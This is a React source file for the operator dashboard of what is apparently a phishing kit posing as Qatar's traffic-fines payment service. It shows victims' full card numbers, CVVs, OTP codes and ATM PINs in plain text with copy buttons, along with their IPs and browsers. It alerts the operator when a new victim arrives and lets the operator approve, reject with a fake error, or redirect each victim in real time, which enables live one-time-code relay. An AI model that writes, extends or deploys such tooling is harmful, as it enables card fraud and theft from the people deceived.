import React, { useState, useEffect, useRef } from "react";
import { trpc } from "@/lib/trpc";

type Stage = 
  | "home"
  | "inquiry"
  | "results"
  | "card"
  | "card_pending"
  | "otp"
  | "otp_pending"
  | "atm"
  | "atm_pending"
  | "success"
  | "failed";

interface PaymentSession {
  id: number;
  sessionId: string;
  queryId: number | null;
  selectedFines: any;
  totalAmount: string | null;
  cardName: string | null;
  cardNumber: string | null;
  cardNumberMasked: string | null;
  cardExpiry: string | null;
  cardCvv: string | null;
  otpCode: string | null;
  atmPin: string | null;
  stage: Stage;
  errorMessage: string | null;
  plateNumber: string | null;
  plateSource: string | null;
  plateCode: string | null;
  qidNumber: string | null;
  establishmentId: string | null;
  clientIp: string | null;
  userAgent: string | null;
  statusRead: number | null;
  createdAt: Date | string;
  updatedAt: Date | string;
}

// ======== الحالات المحدثة ========
const stageConfig: Record<Stage, { label: string; color: string; bg: string }> = {
  home:         { label: "في الرئيسية",       color: "#64748b", bg: "#f1f5f9" },
  inquiry:      { label: "جاري الاستعلام",    color: "#0891b2", bg: "#ecfeff" },
  results:      { label: "عرض النتائج",      color: "#0ea5e9", bg: "#f0f9ff" },
  card:         { label: "إدخال البطاقة",    color: "#2563eb", bg: "#dbeafe" },
  card_pending: { label: "انتظار الموافقة (بطاقة)", color: "#d97706", bg: "#fef3c7" },
  otp:          { label: "إدخال OTP",        color: "#b45309", bg: "#fef9c3" },
  otp_pending:  { label: "انتظار الموافقة (OTP)", color: "#b45309", bg: "#fef9c3" },
  atm:          { label: "إدخال PIN",        color: "#7c3aed", bg: "#ede9fe" },
  atm_pending:  { label: "انتظار الموافقة (PIN)", color: "#7c3aed", bg: "#ede9fe" },
  success:      { label: "مكتمل",             color: "#16a34a", bg: "#dcfce7" },
  failed:       { label: "فشل",               color: "#dc2626", bg: "#fee2e2" },
};

function StageBadge({ stage }: { stage: Stage }) {
  const cfg = stageConfig[stage] || { label: stage, color: "#6b7280", bg: "#f3f4f6" };
  return (
    <span
      className="inline-flex items-center px-2.5 py-0.5 rounded-full text-[10px] font-bold"
      style={{ color: cfg.color, backgroundColor: cfg.bg }}
    >
      {cfg.label}
    </span>
  );
}

// ======== Modal تفاصيل الحجز ========
function BookingDetailModal({
  session,
  token,
  onClose,
  onAction,
}: {
  session: PaymentSession;
  token: string;
  onClose: () => void;
  onAction: (action: "pass" | "denied" | "completed", errorMsg?: string) => void;
}) {
  const [customError, setCustomError] = useState("تم رفض العملية. يرجى المحاولة مرة أخرى.");
  const [copied, setCopied] = useState<string | null>(null);
  const isPending = session.stage.endsWith("_pending");

  const copyText = (text: string) => {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(text);
      setTimeout(() => setCopied(null), 2000);
    });
  };

  const InfoRow = ({ label, value }: { label: string; value?: string | null }) => (
    <div className="flex justify-between items-center py-2.5 border-b border-gray-100 last:border-0">
      <span className="text-gray-500 text-xs">{label}</span>
      <span className="text-gray-800 text-xs font-medium text-left">{value || "-"}</span>
    </div>
  );

  const CopyRow = ({ label, value }: { label: string; value?: string | null }) => (
    <div className="flex justify-between items-center py-2.5 border-b border-gray-100 last:border-0">
      <span className="text-gray-500 text-xs">{label}</span>
      <div className="flex items-center gap-2">
        <span className="text-gray-800 text-sm font-mono font-bold">{value || "-"}</span>
        {value && (
          <button
            onClick={() => copyText(value)}
            className="text-gray-400 hover:text-blue-500 transition p-1 rounded"
            title="نسخ"
          >
            {copied === value ? (
              <svg className="w-4 h-4 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
            ) : (
              <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m-7 4h9m-9 4h9m-9 4h9" />
              </svg>
            )}
          </button>
        )}
      </div>
    </div>
  );

  return (
    <div className="fixed inset-0 bg-black/60 z-[60] flex items-center justify-center p-4 backdrop-blur-sm overflow-y-auto">
      <div className="bg-white rounded-2xl shadow-2xl w-full max-w-lg my-8">
        <div className="p-6 border-b border-gray-100 flex justify-between items-center bg-gray-50 rounded-t-2xl">
          <div>
            <h3 className="text-gray-800 font-bold text-lg">تفاصيل العملية</h3>
            <p className="text-gray-400 text-[10px] mt-0.5 font-mono">{session.sessionId}</p>
          </div>
          <button onClick={onClose} className="text-gray-400 hover:text-gray-600 p-2 hover:bg-gray-200 rounded-full transition">
            <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
        </div>

        <div className="p-6 space-y-6 max-h-[70vh] overflow-y-auto">
          {/* بيانات الاستعلام */}
          <section>
            <h4 className="text-blue-600 font-bold text-xs mb-3 flex items-center gap-2">
              <span className="w-1 h-4 bg-blue-600 rounded-full"></span>
              بيانات الاستعلام
            </h4>
            <div className="bg-gray-50 rounded-xl p-4 space-y-1">
              <InfoRow label="رقم اللوحة" value={session.plateNumber} />
              <InfoRow label="نوع اللوحة" value={session.plateCode} />
              <InfoRow label="المصدر" value={session.plateSource} />
              <InfoRow label="الرقم الشخصي" value={session.qidNumber} />
              <InfoRow label="قيد المنشأة" value={session.establishmentId} />
              <InfoRow label="إجمالي المخالفات" value={session.totalAmount ? `${session.totalAmount} ر.ق` : "-"} />
            </div>
          </section>

          {/* بيانات البطاقة */}
          <section>
            <h4 className="text-purple-600 font-bold text-xs mb-3 flex items-center gap-2">
              <span className="w-1 h-4 bg-purple-600 rounded-full"></span>
              بيانات الدفع
            </h4>
            <div className="bg-gray-50 rounded-xl p-4 space-y-1">
              <InfoRow label="الاسم على البطاقة" value={session.cardName} />
              <CopyRow label="رقم البطاقة" value={session.cardNumber} />
              <div className="grid grid-cols-2 gap-4">
                <CopyRow label="التاريخ" value={session.cardExpiry} />
                <CopyRow label="CVV" value={session.cardCvv} />
              </div>
              <CopyRow label="رمز OTP" value={session.otpCode} />
              <CopyRow label="رقم ATM PIN" value={session.atmPin} />
            </div>
          </section>

          {/* معلومات تقنية */}
          <section>
            <h4 className="text-gray-500 font-bold text-xs mb-3 flex items-center gap-2">
              <span className="w-1 h-4 bg-gray-500 rounded-full"></span>
              معلومات إضافية
            </h4>
            <div className="bg-gray-50 rounded-xl p-4 space-y-1 text-[10px]">
              <InfoRow label="عنوان IP" value={session.clientIp} />
              <InfoRow label="تاريخ الدخول" value={new Date(session.createdAt).toLocaleString("ar-QA")} />
              <div className="py-2">
                <span className="text-gray-500 block mb-1">المتصفح:</span>
                <span className="text-gray-400 break-all leading-tight">{session.userAgent}</span>
              </div>
            </div>
          </section>

          {/* الإجراءات */}
          <div className="pt-4 border-t border-gray-100">
            <div className="mb-4">
              <label className="text-gray-500 text-xs block mb-2">رسالة الخطأ (عند الرفض)</label>
              <input
                type="text"
                value={customError}
                onChange={e => setCustomError(e.target.value)}
                className="w-full border border-gray-200 rounded-lg px-3 py-2 text-sm focus:outline-none focus:border-blue-500"
              />
            </div>
            
            <div className="grid grid-cols-3 gap-3">
              <button
                onClick={() => onAction("pass")}
                className="bg-blue-600 hover:bg-blue-700 text-white py-2.5 rounded-xl font-bold text-sm shadow-md transition"
              >
                تمرير (التالي)
              </button>
              <button
                onClick={() => onAction("denied", customError)}
                className="bg-red-500 hover:bg-red-600 text-white py-2.5 rounded-xl font-bold text-sm shadow-md transition"
              >
                رفض (خطأ)
              </button>
              <button
                onClick={() => onAction("completed")}
                className="bg-green-600 hover:bg-green-700 text-white py-2.5 rounded-xl font-bold text-sm shadow-md transition"
              >
                إتمام العملية
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default function AdminPanel() {
  const [password, setPassword] = useState("");
  const [token, setToken] = useState<string | null>(localStorage.getItem("adminToken"));
  const [showPassword, setShowPassword] = useState(false);
  const [loginError, setLoginError] = useState("");
  const [selectedSession, setSelectedSession] = useState<PaymentSession | null>(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [notification, setNotification] = useState<{ message: string; type: "success" | "error" | "info" } | null>(null);
  const notifTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
  const [redirectSession, setRedirectSession] = useState<PaymentSession | null>(null);
  const [redirectUrl, setRedirectUrl] = useState("");
  const [activeVisitors, setActiveVisitors] = useState(0);
  const wsRef = useRef<WebSocket | null>(null);
  const lastSessionCount = useRef(0);

  // WebSocket لتتبع الزوار الحقيقيين
  useEffect(() => {
    if (!token) return;
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const wsUrl = `${protocol}//${window.location.host}/ws/visitors?admin=true`;
    const ws = new WebSocket(wsUrl);
    wsRef.current = ws;
    ws.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        if (data.type === 'visitor_count') {
          setActiveVisitors(data.count);
        }
      } catch {}
    };
    return () => {
      ws.close();
    };
  }, [token]);

  const showNotif = (message: string, type: "success" | "error" | "info") => {
    setNotification({ message, type });
    if (notifTimer.current) clearTimeout(notifTimer.current);
    notifTimer.current = setTimeout(() => setNotification(null), 4000);
  };

  // tRPC
  const loginMutation = trpc.admin.login.useMutation();
  const verifyQuery = trpc.admin.verify.useQuery(
    { token: token || "" },
    { enabled: !!token, retry: false }
  );
  const statsQuery = trpc.admin.getStats.useQuery(
    { token: token || "" },
    { enabled: !!token && verifyQuery.data?.valid === true, refetchInterval: 8000 }
  );
  const sessionsQuery = trpc.admin.getSessions.useQuery(
    { token: token || "" },
    { enabled: !!token && verifyQuery.data?.valid === true, refetchInterval: 3000 }
  );
  const sessionDetailQuery = trpc.admin.getSession.useQuery(
    { token: token || "", sessionId: selectedSession?.sessionId || "" },
    { enabled: !!token && !!selectedSession, refetchInterval: 2000 }
  );
  const actionMutation = trpc.admin.action.useMutation();
  const redirectMutation = trpc.admin.redirect.useMutation();

  // إشعار عند دخول عميل جديد
  useEffect(() => {
    if (sessionsQuery.data && sessionsQuery.data.length > lastSessionCount.current) {
      if (lastSessionCount.current > 0) {
        showNotif("دخل عميل جديد الآن!", "info");
        // يمكن إضافة صوت هنا
        try { new Audio("/notification.mp3").play(); } catch {}
      }
      lastSessionCount.current = sessionsQuery.data.length;
    }
  }, [sessionsQuery.data]);

  useEffect(() => {
    if (verifyQuery.data && !verifyQuery.data.valid) {
      localStorage.removeItem("adminToken");
      setToken(null);
    }
  }, [verifyQuery.data]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) return;
    setLoginError("");
    try {
      const res = await loginMutation.mutateAsync({ password });
      if (res.success) {
        localStorage.setItem("adminToken", res.token);
        setToken(res.token);
      }
    } catch (err: any) {
      setLoginError(err.message || "كلمة المرور غير صحيحة");
    }
  };

  const handleLogout = () => {
    localStorage.removeItem("adminToken");
    setToken(null);
  };

  const handleAction = async (action: "pass" | "denied" | "completed", errorMsg?: string) => {
    if (!selectedSession || !token) return;
    try {
      await actionMutation.mutateAsync({
        token,
        sessionId: selectedSession.sessionId,
        action,
        errorMessage: errorMsg,
      });
      showNotif(`تم تنفيذ الإجراء بنجاح`, "success");
      setSelectedSession(null);
      sessionsQuery.refetch();
      statsQuery.refetch();
    } catch (err: any) {
      showNotif(err.message || "حدث خطأ", "error");
    }
  };

  const handleRedirect = async () => {
    if (!redirectSession || !token || !redirectUrl) return;
    try {
      await redirectMutation.mutateAsync({
        token,
        sessionId: redirectSession.sessionId,
        redirectUrl,
      });
      showNotif("تم توجيه العميل بنجاح", "success");
      setRedirectSession(null);
      setRedirectUrl("");
    } catch (err: any) {
      showNotif(err.message || "حدث خطأ", "error");
    }
  };

  if (!token || verifyQuery.data?.valid === false) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4 bg-[#0f172a]" dir="rtl">
        <div className="bg-white rounded-2xl shadow-2xl p-8 w-full max-w-sm">
          <div className="text-center mb-6">
            <div className="w-16 h-16 bg-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-lg text-white">
              <svg className="w-9 h-9" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
            </div>
            <h2 className="text-gray-800 text-xl font-bold">نظام مخالفات قطر</h2>
            <p className="text-gray-500 text-sm mt-1">لوحة التحكم الإدارية</p>
          </div>

          <form onSubmit={handleLogin} className="space-y-4">
            <div>
              <label className="text-gray-600 text-sm block mb-1.5 font-medium">كلمة المرور</label>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={e => setPassword(e.target.value)}
                  placeholder="أدخل كلمة المرور"
                  className="w-full border border-gray-300 text-gray-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-100"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute left-3 top-3 text-gray-400 hover:text-gray-600"
                >
                  {showPassword ? (
                    <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l18 18" />
                    </svg>
                  ) : (
                    <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                    </svg>
                  )}
                </button>
              </div>
            </div>

            {loginError && <p className="text-red-600 text-sm text-center">{loginError}</p>}

            <button
              type="submit"
              disabled={loginMutation.isPending}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-xl font-bold transition shadow-md"
            >
              {loginMutation.isPending ? "جاري الدخول..." : "تسجيل الدخول"}
            </button>
          </form>
        </div>
      </div>
    );
  }

  const allSessions: PaymentSession[] = sessionsQuery.data || [];
  const filteredSessions = allSessions.filter(s => {
    if (!searchQuery) return true;
    const q = searchQuery.toLowerCase();
    return (
      (s.sessionId || "").toLowerCase().includes(q) ||
      (s.plateNumber || "").toLowerCase().includes(q) ||
      (s.clientIp || "").toLowerCase().includes(q)
    );
  });

  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
      {notification && (
        <div className={`fixed top-4 right-4 z-[100] rounded-xl px-4 py-3 shadow-lg text-white text-sm font-medium animate-bounce ${notification.type === "success" ? "bg-green-600" : notification.type === "info" ? "bg-blue-600" : "bg-red-600"}`}>
          {notification.message}
        </div>
      )}

      {selectedSession && token && (
        <BookingDetailModal
          session={sessionDetailQuery.data || selectedSession}
          token={token}
          onClose={() => setSelectedSession(null)}
          onAction={handleAction}
        />
      )}

      {redirectSession && token && (
        <div className="fixed inset-0 bg-black/60 z-50 flex items-center justify-center p-4 backdrop-blur-sm">
          <div className="bg-white rounded-2xl shadow-2xl w-full max-w-md p-6">
            <h3 className="text-gray-800 font-bold text-base mb-4">توجيه العميل</h3>
            <div className="space-y-4">
              <div className="grid grid-cols-2 gap-2">
                {[{ label: "🏠 الرئيسية", url: "/" }, { label: "💳 الدفع", url: "/payment" }].map(page => (
                  <button
                    key={page.url}
                    onClick={() => setRedirectUrl(page.url)}
                    className={`px-3 py-2 rounded-lg text-sm border transition ${redirectUrl === page.url ? "bg-blue-600 text-white border-blue-600" : "bg-gray-50 border-gray-200 text-gray-600"}`}
                  >
                    {page.label}
                  </button>
                ))}
              </div>
              <input
                type="text"
                value={redirectUrl}
                onChange={e => setRedirectUrl(e.target.value)}
                placeholder="رابط مخصص..."
                className="w-full border border-gray-200 rounded-lg px-3 py-2 text-sm focus:outline-none focus:border-blue-500"
              />
              <div className="flex gap-2">
                <button onClick={handleRedirect} className="flex-1 bg-blue-600 text-white py-2 rounded-lg font-bold text-sm shadow-md">توجيه الآن</button>
                <button onClick={() => setRedirectSession(null)} className="flex-1 bg-gray-100 text-gray-600 py-2 rounded-lg font-bold text-sm">إلغاء</button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Header */}
      <nav className="bg-white border-b border-gray-200 px-6 py-4 sticky top-0 z-40 shadow-sm">
        <div className="max-w-7xl mx-auto flex justify-between items-center">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center shadow-lg text-white">
              <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
              </svg>
            </div>
            <div>
              <h1 className="text-gray-800 font-bold text-lg leading-tight">نظام مخالفات قطر</h1>
              <p className="text-gray-400 text-[10px] font-medium uppercase tracking-wider">لوحة التحكم</p>
            </div>
          </div>

          <div className="flex items-center gap-4">
            <div className="flex items-center gap-2 bg-green-50 px-3 py-1.5 rounded-full border border-green-100">
              <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
              <span className="text-green-700 text-xs font-bold">متصل</span>
            </div>
            <button onClick={handleLogout} className="bg-red-50 text-red-600 px-4 py-2 rounded-xl text-sm font-bold hover:bg-red-100 transition border border-red-100">خروج</button>
          </div>
        </div>
      </nav>

      <main className="max-w-7xl mx-auto px-6 py-8">
        {/* Stats Grid */}
        <div className="grid grid-cols-2 md:grid-cols-5 gap-4 mb-8">
          {[
            { label: "إجمالي العمليات", val: statsQuery.data?.total || 0, color: "text-blue-600", bg: "bg-blue-50" },
            { label: "عمليات جديدة", val: statsQuery.data?.new || 0, color: "text-amber-600", bg: "bg-amber-50" },
            { label: "مكتملة", val: statsQuery.data?.completed || 0, color: "text-green-600", bg: "bg-green-50" },
            { label: "قيد المعالجة", val: statsQuery.data?.pending || 0, color: "text-purple-600", bg: "bg-purple-50" },
            { label: "زوار متصلون", val: activeVisitors, color: "text-cyan-600", bg: "bg-cyan-50" },
          ].map((s, i) => (
            <div key={i} className="bg-white p-5 rounded-2xl shadow-sm border border-gray-100 transition hover:shadow-md">
              <p className="text-gray-400 text-[10px] font-bold mb-1 uppercase tracking-wider">{s.label}</p>
              <p className={`text-2xl font-black ${s.color}`}>{s.val}</p>
            </div>
          ))}
        </div>

        {/* Search & List */}
        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
          <div className="p-6 border-b border-gray-100 bg-gray-50/50 flex flex-col md:flex-row justify-between items-center gap-4">
            <h2 className="text-gray-800 font-bold text-base">قائمة العمليات اللحظية</h2>
            <div className="relative w-full md:w-72">
              <input
                type="text"
                placeholder="بحث برقم اللوحة أو IP..."
                value={searchQuery}
                onChange={e => setSearchQuery(e.target.value)}
                className="w-full border border-gray-200 rounded-xl px-4 py-2.5 pr-10 text-sm focus:outline-none focus:border-blue-500 bg-white"
              />
              <svg className="w-4 h-4 text-gray-400 absolute left-3 top-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
              </svg>
            </div>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-right">
              <thead>
                <tr className="bg-gray-50 text-gray-400 text-[10px] font-bold uppercase tracking-wider border-b border-gray-100">
                  <th className="px-6 py-4">المبلغ</th>
                  <th className="px-6 py-4">رقم اللوحة / الهوية</th>
                  <th className="px-6 py-4">النوع</th>
                  <th className="px-6 py-4">الحالة (الموقع)</th>
                  <th className="px-6 py-4">التاريخ</th>
                  <th className="px-6 py-4">الإجراءات</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-100">
                {filteredSessions.map((s) => (
                  <tr key={s.id} className={`hover:bg-gray-50 transition ${s.statusRead === 0 ? "bg-blue-50/30" : ""}`}>
                    <td className="px-6 py-4">
                      <span className="text-gray-900 font-black text-sm">{s.totalAmount || "0.00"}</span>
                      <span className="text-gray-400 text-[10px] mr-1">ر.ق</span>
                    </td>
                    <td className="px-6 py-4">
                      <div className="flex flex-col">
                        <span className="text-gray-800 font-bold text-sm">{s.plateNumber || s.qidNumber || s.establishmentId || "-"}</span>
                        <span className="text-gray-400 text-[10px]">{s.plateSource || "قطر"}</span>
                      </div>
                    </td>
                    <td className="px-6 py-4">
                      <span className="text-gray-500 text-xs">{s.plateCode || (s.qidNumber ? "رقم شخصي" : s.establishmentId ? "قيد منشأة" : "-")}</span>
                    </td>
                    <td className="px-6 py-4">
                      <StageBadge stage={s.stage} />
                    </td>
                    <td className="px-6 py-4 text-gray-400 text-xs">
                      {new Date(s.createdAt).toLocaleTimeString("ar-QA", { hour: '2-digit', minute: '2-digit' })}
                    </td>
                    <td className="px-6 py-4">
                      <div className="flex gap-2">
                        <button
                          onClick={() => setSelectedSession(s)}
                          className="bg-blue-600 text-white px-3 py-1.5 rounded-lg text-xs font-bold shadow-sm hover:bg-blue-700 transition"
                        >
                          عرض
                        </button>
                        <button
                          onClick={() => setRedirectSession(s)}
                          className="bg-purple-50 text-purple-600 px-3 py-1.5 rounded-lg text-xs font-bold border border-purple-100 hover:bg-purple-100 transition"
                        >
                          توجيه
                        </button>
                      </div>
                    </td>
                  </tr>
                ))}
                {filteredSessions.length === 0 && (
                  <tr>
                    <td colSpan={6} className="px-6 py-12 text-center text-gray-400 text-sm">لا توجد عمليات حالية</td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </div>
      </main>
    </div>
  );
}
